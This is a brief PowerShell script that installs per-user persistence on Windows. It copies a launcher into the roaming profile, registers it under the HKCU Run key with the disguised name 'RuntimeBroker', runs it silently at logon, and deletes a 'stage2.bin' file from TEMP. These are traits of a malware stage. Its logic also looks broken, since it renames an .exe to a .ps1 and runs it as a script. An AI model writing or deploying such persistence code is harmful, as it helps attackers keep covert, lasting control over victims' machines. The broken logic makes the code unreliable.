
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = "RuntimeBroker",
    [string]$PersistencePath = "$env:APPDATA\loader.ps1"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "$env:APPDATA\updater.exe" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
$FetchResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue -ErrorAction SilentlyContinue
Write-Verbose ("Registered value: " + $FetchResult.$RegistryValue)

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
